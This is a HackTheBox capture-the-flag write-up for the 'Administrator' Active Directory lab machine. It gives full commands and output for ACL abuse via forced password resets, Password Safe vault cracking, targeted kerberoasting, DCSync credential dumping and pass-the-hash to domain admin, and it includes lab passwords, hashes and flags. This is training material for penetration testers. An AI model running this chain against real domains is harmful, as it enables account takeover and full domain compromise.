---
title: HackTheBox - Administrator
date: 2025-04-19 16:00:00 +/-0000
categories:
  - HackTheBox
  - Windows
tags:
  - hackthebox
  - medium
  - activedirectory
  - windows
  - bloodhound
description: Administrator is an assumed breach scenario in active directory involving bloodhound, DACL abuse and more!
image: /assets/img/posts/administrator/administrator.webp
---

This is a great box and one of my top recommendations for anyone planning to tackle the CPTS exam. 

## Overview

* We start off by carrying out the standard enumeration using our provided credentials before running `bloodhound` via `nxc`.
* Analysing the bloodhound data we can start to form a potential attack chain leveraging different `misconfigurations in the access control lists`.
* Using `bloodyAD` we change users passwords gaining access to a `psafe3 key vault`.
* After cracking the vault we use the credentials to carry out a `targeted kerberoast` on a user with the ability to `DCsync`.
* We can dump the NTDS.dit and gain access as the domain admin!

## Nmap

We start off running the usual nmap scan `nmap -sV -sC -p- <IP> -Pn -v`.

```bash
Nmap scan report for 10.129.226.24
Host is up (0.030s latency).
Not shown: 65510 closed tcp ports (conn-refused)
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-01-14 20:18:44Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
52293/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
52298/tcp open  msrpc         Microsoft Windows RPC
52309/tcp open  msrpc         Microsoft Windows RPC
52320/tcp open  msrpc         Microsoft Windows RPC
56641/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-01-14T20:19:37
|_  start_date: N/A
|_clock-skew: 7h00m01s
```

Nothing too interesting apart from the `FTP` service, Everything else is pretty standard for a domain controller.

## Checking Access

Since we had credentials provided its good to check what we have access to. I checked out `FTP`, `SMB` etc but there was nothing.

Checking for winRM shows that we do have access which also means there is a good chance we have access to LDAP which allows us to run bloodhound via nxc.

```bash
┌──(kryzen㉿kali)-[~/HTB/Boxes/Administrator]
└─$ nxc winrm 10.129.226.24 -u Olivia -p ichliebedich       
WINRM       10.129.226.24   5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb)
WINRM       10.129.226.24   5985   DC               [+] administrator.htb\Olivia:ichliebedich (Pwn3d!)
```

## Checking bloodhound

This built in feature of nxc is great to get familiar with, It saves you needing to manually go and run Sharphound or something else. You can also use bloodhound-python for the same thing.

```bash
┌──(kryzen㉿kali)-[~/HTB/Boxes/Administrator]
└─$ nxc ldap 10.129.226.24 -u Olivia -p ichliebedich --bloodhound -c all --dns-server 10.129.226.24
SMB         10.129.226.24   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
LDAP        10.129.226.24   389    DC               [+] administrator.htb\Olivia:ichliebedich 
LDAP        10.129.226.24   389    DC               Resolved collection methods: rdp, localadmin, session, dcom, acl, container, group, objectprops, psremote, trusts                                                                   
LDAP        10.129.226.24   389    DC               Done in 00M 06S
LDAP        10.129.226.24   389    DC               Compressing output into /home/kryzen/.nxc/logs/DC_10.129.226.24_2025-01-14_135341_bloodhound.zip
```

After loading the data set into bloodhound we can see that Olivia has `GenericAll` over the user Michael.

![](/assets/img/posts/administrator/image%2022.png)

## Changing Michaels Password

With GenericAll we can basically do anything we want with Michael's account. In this case we will change the password using BloodyAD.

```bash
┌──(kryzen㉿kali)-[~/HTB/Boxes/Administrator]
└─$ bloodyAD -u olivia -p 'ichliebedich' -d administrator.htb --host 10.129.226.24 set password michael 'Password123!'
[+] Password changed successfully!
```

Looks like it worked.

```bash
┌──(kryzen㉿kali)-[~/HTB/Boxes/Administrator]
└─$ nxc winrm 10.129.226.24 -u Michael -p 'Password123!'     
WINRM       10.129.226.24   5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb)
WINRM       10.129.226.24   5985   DC               [+] administrator.htb\Michael:Password123! (Pwn3d!)
```

## Enumeration with Michael

The theme of the box seems to be DACL abuse so checking bloodhound again we can see that Michael can change Benjamins password so we will try that.

![](/assets/img/posts/administrator/image1.png)



```bash
┌──(kryzen㉿kali)-[~/HTB/Boxes/Administrator]
└─$ bloodyAD -u michael -p 'Password123!' -d administrator.htb --host 10.129.226.24 set password benjamin 'Password123!'
[+] Password changed successfully!
```


Confirming that it worked.



```bash
┌──(kryzen㉿kali)-[~/HTB/Boxes/Administrator]
└─$ nxc smb 10.129.226.24 -u benjamin -p 'Password123!' --shares
SMB         10.129.226.24   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.129.226.24   445    DC               [+] administrator.htb\benjamin:Password123! 
SMB         10.129.226.24   445    DC               [*] Enumerated shares
SMB         10.129.226.24   445    DC               Share           Permissions     Remark
SMB         10.129.226.24   445    DC               -----           -----------     ------
SMB         10.129.226.24   445    DC               ADMIN$                          Remote Admin
SMB         10.129.226.24   445    DC               C$                              Default share
SMB         10.129.226.24   445    DC               IPC$            READ            Remote IPC
SMB         10.129.226.24   445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.226.24   445    DC               SYSVOL          READ            Logon server share 
```


## Enumeration as Benjamin

First thing I noticed is that benjamin is part of the `Share Moderators` group

Also enumerating bloodhound I found the user `Ethan` has DCsync rights on the domain.

After digging through bloodhound a bit more I think we need to get access to `Emily` who has `Generic All over Account Operators` this would give us access to the user `Ethan`.

After a bit of thought I remembered we had the ftp instance that we were unable to get into with other users. Technically this is a `share` so I decided to try it with benjamin and had some success.

```bash
┌──(kryzen㉿kali)-[~/HTB/Boxes/Administrator]
└─$ nxc ftp 10.129.226.24 -u benjamin -p 'Password123!'   
FTP         10.129.226.24   21     10.129.226.24    [*] Banner: Microsoft FTP Service
FTP         10.129.226.24   21     10.129.226.24    [+] benjamin:Password123!
                                                                                                                    
┌──(kryzen㉿kali)-[~/HTB/Boxes/Administrator]
└─$ ftp benjamin@10.129.226.24
Connected to 10.129.226.24.
220 Microsoft FTP Service
331 Password required
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
229 Entering Extended Passive Mode (|||57610|)
150 Opening ASCII mode data connection.
10-05-24  08:13AM                  952 Backup.psafe3
226 Transfer complete.
```

Inside we found `backup.psafe3` which appears to be some kind of password database.

## Cracking Backup.psafe3

After a bit of trial and error I found that you had to just supply `hashcat` directly with the .psafe3 file to crack it.

```bash
┌──(kryzen㉿kali)-[~/HTB/Boxes/Administrator]
└─$ hashcat -m 5200 Backup.psafe3 /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

<SNIP>

Backup.psafe3:tekieromucho                                
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5200 (Password Safe v3)
Hash.Target......: Backup.psafe3
<SNIP>
```

`tekieromucho`

I had to install the pwsafe program to access it.

```bash
┌──(kryzen㉿kali)-[~/HTB/Boxes/Administrator]
└─$ pwsafe Backup.psafe3   
```

![](/assets/img/posts/administrator/image 2 8.png)

![](/assets/img/posts/administrator/image 3 7.png)

```bash
alexander:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw
emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb
emma:WwANQWnmJnGV07WQN8bMS7FMAbjNur
```

I was able to recover the following passwords.

Confirming access with Emily.

```bash
┌──(kryzen㉿kali)-[~/HTB/Boxes/Administrator]
└─$ nxc winrm 10.129.226.24 -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
WINRM       10.129.226.24   5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb)
WINRM       10.129.226.24   5985   DC               [+] administrator.htb\emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb (Pwn3d!)
```

## User.txt

```bash
┌──(kryzen㉿kali)-[~/HTB/AD/SkillsAssesment]
└─$ evil-winrm -i 10.129.226.24 -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm\#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\emily\Documents> ls
*Evil-WinRM* PS C:\Users\emily\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\emily\Desktop> ls


    Directory: C:\Users\emily\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        10/30/2024   2:23 PM           2308 Microsoft Edge.lnk
-ar---         1/14/2025  12:13 PM             34 user.txt


*Evil-WinRM* PS C:\Users\emily\Desktop> type user.txt
dda42d115cac768a105b18a00d08097b
```

## Privilege Escalation

So now we have access as `Emily`, we had earlier found that she has `GenericWrite` over `Ethan` who has `DCSync` rights on the domain.

I tried a few different techniques here for kerberoasting the user and trying to set shadow credentials but I only found one method that actually ended up working.

## Targetedkerberoast.py

After doing a bit of research I found a good mind-map on the hacker recipes.

[The Hacker Recipes - Mind-map](https://www.thehacker.recipes/assets/DACL%20abuse%20mindmap.CnS4bNaY.png)

I think I should be able to get Targetedkerberoast working but I am getting a `clock skew error`.

```bash
┌──(kryzen㉿kali)-[~/HTB/Boxes/Administrator]
└─$ ./targetedkerberoast.py -v -d administrator.htb -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' --dc-ip 10.129.187.112            
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[!] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
Traceback (most recent call last):
  File "/home/kryzen/HTB/Boxes/Administrator/./targetedkerberoast.py", line 597, in main
    tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(clientName=userName, password=args.auth_password, domain=args.auth_domain, lmhash=None, nthash=auth_nt_hash,
                                             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/kryzen/.local/lib/python3.11/site-packages/impacket/krb5/kerberosv5.py", line 323, in getKerberosTGT
    tgt = sendReceive(encoder.encode(asReq), domain, kdcHost)
          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/kryzen/.local/lib/python3.11/site-packages/impacket/krb5/kerberosv5.py", line 93, in sendReceive
    raise krbError
impacket.krb5.kerberosv5.KerberosError: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

## Resolving clockskew too great

After a bit of trial and error I got it. I found a tool `rdate` that will sync your system time with the domain controller.

`Note: Since I updated to Kali 24.4 after doing this box initially getting this working can be an absolute pain as the time keeps reverting. The solution I have found to work is first set sudo timedatectl set-ntp on then set it off. Once you run rdate or ntpdate it should now work.`

```bash
┌──(kryzen㉿kali)-[~/HTB/Boxes/Administrator]
└─$ sudo rdate -n 10.129.187.112
Wed Jan 15 21:36:22 -01 2025
                                                                                                                    
┌──(kryzen㉿kali)-[~/HTB/Boxes/Administrator]
└─$ timedatectl               
               Local time: Wed 2025-01-15 21:36:36 -01
           Universal time: Wed 2025-01-15 22:36:36 UTC
                 RTC time: Wed 2025-01-15 14:36:35
                Time zone: Atlantic/Azores (-01, -0100)
System clock synchronized: no
              NTP service: inactive
          RTC in local TZ: yes

Warning: The system is configured to read the RTC time in the local time zone.
         This mode cannot be fully supported. It will create various problems
         with time zone changes and daylight saving time adjustments. The RTC
         time is never updated, it relies on external facilities to maintain it.
         If at all possible, use RTC in UTC by calling
         'timedatectl set-local-rtc 0'.
```

Once our clock is sync'd with the DC we can try running targeted kerberoast again.

```bash
┌──(kryzen㉿kali)-[~/HTB/Boxes/Administrator]
└─$ ./targetedkerberoast.py -v -d administrator.htb -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' --dc-ip 10.129.187.112
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[VERBOSE] SPN added successfully for (ethan)
[+] Printing hash for (ethan)
$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$c92c79eae3d34e5d1629d1d9b8bcccc8$87ae8a52f0604ab23d9f3607b408e755e52322f6ced6129ac99d0bd8d9bb52924c9938d7ec87b1cead02976a427265845aef5ee1a25264686bd2dcbc765858247fad87fcf98a49dbbd3518a7f607c53bc3423a6f2f1e0640f622042c0cd992aac5e91efb8bbe732062e0ba1e142743da911cd355196cf61e628d05fc2ed9cd4053f8de5529fac0263374c1c2fb4b7d19eae4fa42cd3a8f0423ae928a733dad46aa89ab749de2d70976bfeda63ecbaa533e79bd804dc9564295bb5f586fd29b21a6d7645fa2c88d73d5bf80f521643705473507cb1dfa71f5b8d10061cb059d22b111021d36a6b82ba9418fd2f95bd64c6a07af18e53a8dd55439899ff803960e6ba78fd41ad2554108d35cef85d0618ab61ec115d5b252a452c7c26ea0d3b9cfe019eaa30e83d34de83db176f457acd92a3f36ca8d59af0a1788bac7f0df88af16f5fd93e89d824fec43ce94b8caa3857d69b375e82add59e50a36aaec9bac1891756c0fe40a11b28c602722d463e5c221d96d5b3caa66f7cb598b62e174a60d4540b024407a118dd643567ee746154e1bb06e4d3a6cbc3bd676409bd918b1f24b22b94833539f1eeb90a729dbf56a085cf0a0b4a2fe94d0d39793f3486b71412bb7c2534c85f0119b643602137ed42f0d0225a13361fd4eaf3866975478bd2f288605ebff2e49b0bac1700eeec13544fbb3dca1b4291be798b61a4e801358ac145b42054b317be10c53581446add25c807330ba64a014b106ee8e900dfae9715354e14d2b213dc4da6cfd7e7f61c4e2241aa8cb69e215a11acfc85a76dde596637a72cd5587e295f4cf55da8a256357b61128c766d9fd41d6dbfdce81a1e5893629f5ac80aad6674294a1a88f7df6874050365cd97a7ad69030ed76e23f4fff215b04e11879191fd50f1d65f6af8415400c42986f815d4ccffdb78ad02ccedff02d34324ad942b4f43d8e2dc67bf4ed2dbabfeea56621fdd8308ffd867ae1d16cebe15b90e62dca60aa1530f8bf6da24a28b572375aa7e0419e11a53185a4ae7e843fc8b6c7a859405976ec5da68d244d8ccec54ae0480f82e8287d803017730e9340c4edc0806a36339e0d154fbc3a349eeece99e887570482e35655b074b46cd71315ff0fd616dd0f8e5f7bc797959d550d9d97d5dfb5b70750c60752839d09b65d08f8f6c3e3f61e7dc1006473cebf883b47e5fbdb78c5d642b92905c5a612a0ac5fccf6fb8d10a0c25b80e7aac0ccf8cec31f412dc1ba69834adecf70d2ef4b62e9902d0edfce9bacd7b79c56bcad1eb1e42da00f65a65fffde6d625c93d58bbe17c6697acb18caa506f7cdbe0d8b001c70c13db1be9c4813480b0f32051b423203cfcbfb72454e29d9f26812a66a869e1ff74f97765e2a23e2fdaf0adc8bea49a3b26f34844b2b958281887b162c6730afa14cf83b0ef40ea0699f91ac109b6f8c91969d245e3cf0ea7f2daa3ca836b1c76a0be682310c88811caec4ee7c4b39bd8dc3c7e18e72b35fb56f6a537d064e4b76cdd8228d128092ae3c84
[VERBOSE] SPN removed successfully for (ethan)
```

This time it works!

# Cracking the hash

We can then take the hash and attempt to crack it using hashcat.

```bash
┌──(kryzen㉿kali)-[~/HTB/Boxes/Administrator]
└─$ hashcat ethanhash.txt /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting in autodetect mode

<SNIP>
$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$c92c79eae3d34e5d1629d1d9b8bcccc8$87ae8a52f0604ab23d9f3607b408e755e52322f6ced6129ac99d0bd8d9bb52924c9938d7ec87b1cead02976a427265845aef5ee1a25264686bd2dcbc765858247fad87fcf98a49dbbd3518a7f607c53bc3423a6f2f1e0640f622042c0cd992aac5e91efb8bbe732062e0ba1e142743da911cd355196cf61e628d05fc2ed9cd4053f8de5529fac0263374c1c2fb4b7d19eae4fa42cd3a8f0423ae928a733dad46aa89ab749de2d70976bfeda63ecbaa533e79bd804dc9564295bb5f586fd29b21a6d7645fa2c88d73d5bf80f521643705473507cb1dfa71f5b8d10061cb059d22b111021d36a6b82ba9418fd2f95bd64c6a07af18e53a8dd55439899ff803960e6ba78fd41ad2554108d35cef85d0618ab61ec115d5b252a452c7c26ea0d3b9cfe019eaa30e83d34de83db176f457acd92a3f36ca8d59af0a1788bac7f0df88af16f5fd93e89d824fec43ce94b8caa3857d69b375e82add59e50a36aaec9bac1891756c0fe40a11b28c602722d463e5c221d96d5b3caa66f7cb598b62e174a60d4540b024407a118dd643567ee746154e1bb06e4d3a6cbc3bd676409bd918b1f24b22b94833539f1eeb90a729dbf56a085cf0a0b4a2fe94d0d39793f3486b71412bb7c2534c85f0119b643602137ed42f0d0225a13361fd4eaf3866975478bd2f288605ebff2e49b0bac1700eeec13544fbb3dca1b4291be798b61a4e801358ac145b42054b317be10c53581446add25c807330ba64a014b106ee8e900dfae9715354e14d2b213dc4da6cfd7e7f61c4e2241aa8cb69e215a11acfc85a76dde596637a72cd5587e295f4cf55da8a256357b61128c766d9fd41d6dbfdce81a1e5893629f5ac80aad6674294a1a88f7df6874050365cd97a7ad69030ed76e23f4fff215b04e11879191fd50f1d65f6af8415400c42986f815d4ccffdb78ad02ccedff02d34324ad942b4f43d8e2dc67bf4ed2dbabfeea56621fdd8308ffd867ae1d16cebe15b90e62dca60aa1530f8bf6da24a28b572375aa7e0419e11a53185a4ae7e843fc8b6c7a859405976ec5da68d244d8ccec54ae0480f82e8287d803017730e9340c4edc0806a36339e0d154fbc3a349eeece99e887570482e35655b074b46cd71315ff0fd616dd0f8e5f7bc797959d550d9d97d5dfb5b70750c60752839d09b65d08f8f6c3e3f61e7dc1006473cebf883b47e5fbdb78c5d642b92905c5a612a0ac5fccf6fb8d10a0c25b80e7aac0ccf8cec31f412dc1ba69834adecf70d2ef4b62e9902d0edfce9bacd7b79c56bcad1eb1e42da00f65a65fffde6d625c93d58bbe17c6697acb18caa506f7cdbe0d8b001c70c13db1be9c4813480b0f32051b423203cfcbfb72454e29d9f26812a66a869e1ff74f97765e2a23e2fdaf0adc8bea49a3b26f34844b2b958281887b162c6730afa14cf83b0ef40ea0699f91ac109b6f8c91969d245e3cf0ea7f2daa3ca836b1c76a0be682310c88811caec4ee7c4b39bd8dc3c7e18e72b35fb56f6a537d064e4b76cdd8228d128092ae3c84:limpbizkit
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator....ae3c84
<SNIP>
```

`ethan:limpbizkit`

## DCSYNC

Since ethan has `DCsync` right we can use that to dump NTDS.dit using secretsdump.

```bash
┌──(kryzen㉿kali)-[~/HTB/Boxes/Administrator]
└─$ impacket-secretsdump -outputfile administrator.htb_hashes -just-dc administrator.htb/ethan@10.129.187.112
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
<SNIP>
[*] Cleaning up... 
```

## Pass the hash for Root.txt

Using the domain admin hash we can perform a pass the hash attack.

```bash
┌──(kryzen㉿kali)-[~/HTB/AD/SkillsAssesment]
└─$ evil-winrm -i 10.129.187.112 -u 'administrator' -H '3dc553ce4b9fd20bd016e098d2d2fd2e'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                                                                 
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm\#Remote-path-completion                                                                                                                   
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
administrator\administrator
```

Getting root flag.

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
40fe1dfa36c62be48b183aef21247092
```


Thanks for reading!
